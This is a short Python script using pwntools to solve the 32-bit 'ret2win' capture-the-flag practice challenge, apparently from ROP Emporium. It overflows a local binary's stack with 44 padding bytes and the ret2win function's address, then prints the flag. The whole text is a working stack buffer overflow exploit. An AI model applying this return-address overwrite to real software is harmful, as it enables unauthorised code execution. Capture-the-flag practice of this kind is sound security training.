from pwn import *

context.arch = "i386"
context.log_level = "critical"

bin = "./ret2win32"
elf = ELF(bin)
p = process(bin)

p.recvuntil("> ")

payload = [
    b"A"*44,
    p32(elf.symbols["ret2win"])
]

payload = b"".join(payload)
p.sendline(payload)

print(re.search(b"ROPE{(.+?)}", p.recvall()).group(0))
